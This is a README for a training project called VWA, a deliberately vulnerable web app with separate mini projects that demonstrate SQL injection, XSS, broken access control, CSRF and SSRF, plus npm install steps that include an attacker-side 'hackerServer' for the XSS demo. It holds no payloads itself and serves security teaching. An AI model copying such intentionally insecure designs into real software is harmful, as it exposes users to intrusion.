## (VWA) Vulnerable Web Application ðŸš€

That application demonstrates top 5 (**SQli, XSS, Broken Access Control, CSRF, SSRF**) critical web vulnerabilities. You can run and test them out!

_The whole project consist of mini projects with each vulnerability_

P.S: I tried not to use any databases for simpler and faster installation but for some vulnerabilities it was required such as: **SQli**

---

## Quick Installation

(Go to folder with mini project and do **npm i**)

```plaintext
cd VWA/sqli/1
npm i

cd VWA/xss/1
npm i

cd VWA/xss/hackerServer
npm i
```

If you want to test SQli you need to create **postgresql** database with that credentials
